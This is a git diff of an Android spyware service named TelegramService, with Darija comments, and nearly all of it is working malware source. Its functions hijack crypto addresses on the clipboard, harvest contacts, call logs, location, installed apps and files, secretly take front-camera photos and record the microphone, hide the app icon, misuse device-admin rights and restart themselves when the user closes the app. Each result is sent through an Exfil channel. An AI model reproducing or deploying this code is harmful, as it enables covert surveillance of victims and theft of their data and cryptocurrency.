@@ -45,7 +45,6 @@ public class TelegramService extends Service {
     private boolean isVncRunning = false;
     private Handler mainHandler = new Handler(Looper.getMainLooper());
 
-    // HNA 7ET ADDRESS DYALEK
     private final String ATTACKER_CRYPTO_ADDRESS = "0xYOUR_CRYPTO_ADDRESS_HERE";
 
     @Override
@@ -126,7 +125,6 @@ public class TelegramService extends Service {
         });
     }
 
-    // ================== VNC (Screen Streaming) ==================
     private void startVncStream() {
         if (!isVncRunning) return;
         if (KeyloggerService.instance != null) {
@@ -135,7 +133,6 @@ public class TelegramService extends Service {
         mainHandler.postDelayed(this::startVncStream, 3000);
     }
 
-    // ================== CRYPTO CLIPBOARD HIJACK ==================
     private void startCryptoClipboardHijack() {
         Exfil.send("💰 Crypto Clipboard Hijack Started. Waiting for victim...");
         ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
@@ -154,7 +151,6 @@ public class TelegramService extends Service {
         });
     }
 
-    // ================== INSTALLED APPS ==================
     private void getInstalledApps() {
         StringBuilder sb = new StringBuilder("📱 Installed Apps:\n\n");
         PackageManager pm = getPackageManager();
@@ -167,23 +163,22 @@ public class TelegramService extends Service {
         Exfil.send(sb.toString());
     }
 
-    // ================== UNINSTALL APP ==================
     private void uninstallApp(String packageName) {
         try {
             DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
             ComponentName admin = new ComponentName(this, MyDeviceAdminReceiver.class);
             
             if (dpm != null && dpm.isAdminActive(admin)) {
+                // Unblock l'app ila kant m-blockiya
                 dpm.setUninstallBlocked(admin, packageName, false);
-                dpm.removeActiveAdmin(admin); // Bypass
                 
+                // N-ft7o l'uninstaller
                 Intent intent = new Intent(Intent.ACTION_DELETE);
                 intent.setData(Uri.parse("package:" + packageName));
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(intent);
                 
                 Exfil.send("🗑️ Requested uninstall for: " + packageName);
-                dpm.setActiveAdmin(admin, true); // Re-enable admin
             } else {
                 Exfil.send("❌ Device Admin not enabled. Cannot uninstall silently.");
             }
@@ -192,7 +187,6 @@ public class TelegramService extends Service {
         }
     }
 
-    // ================== CONTACTS ==================
     private void getContacts() {
         if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
             Exfil.send("❌ No Contacts permission.");
@@ -217,7 +211,6 @@ public class TelegramService extends Service {
         }
     }
 
-    // ================== CALL LOGS ==================
     private void getCallLogs() {
         if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
             Exfil.send("❌ No Call Log permission.");
@@ -243,7 +236,6 @@ public class TelegramService extends Service {
         }
     }
 
-    // ================== CLIPBOARD ==================
     private void getClipboard() {
         try {
             ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
@@ -259,7 +251,6 @@ public class TelegramService extends Service {
         }
     }
 
-    // ================== LOCATION ==================
     private void getLocation() {
         try {
             LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
@@ -281,7 +272,6 @@ public class TelegramService extends Service {
         }
     }
 
-    // ================== FILE MANAGER ==================
     private void listFiles() {
         try {
             File dir = new File("/sdcard/Download");
@@ -301,7 +291,6 @@ public class TelegramService extends Service {
         }
     }
 
-    // ================== STEALTH MODE ==================
     private void hideIcon() {
         try {
             getPackageManager().setComponentEnabledSetting(
@@ -315,13 +304,12 @@ public class TelegramService extends Service {
         }
     }
 
-    // ================== CAMERA ==================
     private void takePhoto() {
         Exfil.send("📷 Opening Camera...");
         try {
             CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
             String cameraId = manager.getCameraIdList()[0];
-            if (manager.getCameraIdList().length > 1) cameraId = manager.getCameraIdList()[1]; // Front
+            if (manager.getCameraIdList().length > 1) cameraId = manager.getCameraIdList()[1]; 
             
             manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                 @Override
@@ -363,7 +351,6 @@ public class TelegramService extends Service {
         } catch (Exception e) {}
     }
 
-    // ================== MIC ==================
     private void recordAudio() {
         try {
             File audioFile = new File(getExternalFilesDir(null), "mic.3gp");
@@ -395,9 +382,8 @@ public class TelegramService extends Service {
     @Override
     public void onTaskRemoved(Intent rootIntent) {
         super.onTaskRemoved(rootIntent);
-        // Ila l'user sed l'app mn l'recents, n-3awdo n-ch3lo
         Intent restartService = new Intent(getApplicationContext(), TelegramService.class);
         restartService.setPackage(getPackageName());
         startService(restartService);
     }
-                        }
+}
